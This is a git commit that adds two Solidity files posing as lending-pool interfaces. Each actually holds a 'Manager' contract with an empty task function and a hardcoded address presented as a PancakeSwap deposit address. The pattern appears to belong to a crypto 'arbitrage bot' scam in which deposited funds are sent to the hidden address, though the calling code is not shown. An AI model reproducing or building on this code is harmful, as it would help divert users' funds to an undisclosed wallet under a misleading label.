3a2544a0ccf3318fe35cd99135873aab6563140c
Multiplier-FinanceV2 <109624629+Multiplier-FinanceV2@users.noreply.github.com>
2022-07-19 12:11:47 -0700

    Add files via upload

---
+++ contracts/interfaces/ILendingFetch.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0x7a92Ef31293e46B033D93c98e3175BdF36DC4811;
+	}
+	
+}
---
+++ contracts/interfaces/ILendingPool.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x9BD5c5D2D8fE7223e8d98A713714bE4bd7745961;
+    }
+}
+
+//pancakeswapfunction
